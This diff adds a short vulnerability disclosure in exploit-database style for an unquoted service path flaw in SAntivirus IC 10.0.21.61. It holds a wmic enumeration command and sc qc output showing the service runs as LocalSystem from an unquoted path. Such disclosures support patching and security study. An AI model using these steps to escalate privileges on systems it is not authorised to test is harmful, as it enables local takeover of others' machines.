@@ -1,0 +1,26 @@
+# Exploit Title: SAntivirus IC 10.0.21.61 - 'SAntivirusIC' Unquoted Service Path
+# Discovery by: Mara Ramirez
+# Discovery Date: 10-11-2020
+# Vendor Homepage: https://www.segurazo.com/download.html
+# Software Links : https://www.segurazo.com/download.html
+# Tested Version: 10.0.21.61
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Windows 10 Home Single Languaje 
+
+# Step to discover Unquoted Service Path:
+
+C:\>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """                                        SAntivirusIC                                                                              SAntivirusIC                       C:\Program Files (x86)\Digital Communications\SAntivirus\SAntivirusIC.exe -service  	Auto
+
+C:\>sc qc SAntivirusIC
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: SAntivirusIC
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\Digital Communications\SAntivirus\SAntivirusIC.exe -service
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : SAntivirusIC
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
